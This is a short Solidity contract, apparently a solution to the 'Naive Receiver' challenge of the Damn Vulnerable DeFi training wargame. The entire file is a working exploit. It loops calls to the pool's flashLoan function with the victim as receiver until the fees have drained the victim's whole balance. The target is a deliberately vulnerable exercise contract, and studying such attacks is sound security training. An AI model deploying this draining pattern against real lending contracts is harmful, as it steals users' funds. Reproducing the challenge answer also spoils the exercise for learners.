// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

/**
 * @title ReceiverDrainer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ReceiverDrainer {
	function drain(address payable poolAddress, address receiverAddress) public {
		while(receiverAddress.balance > 0) {
			NaiveReceiverLenderPool(poolAddress).flashLoan(receiverAddress, 1);
		}
	}
}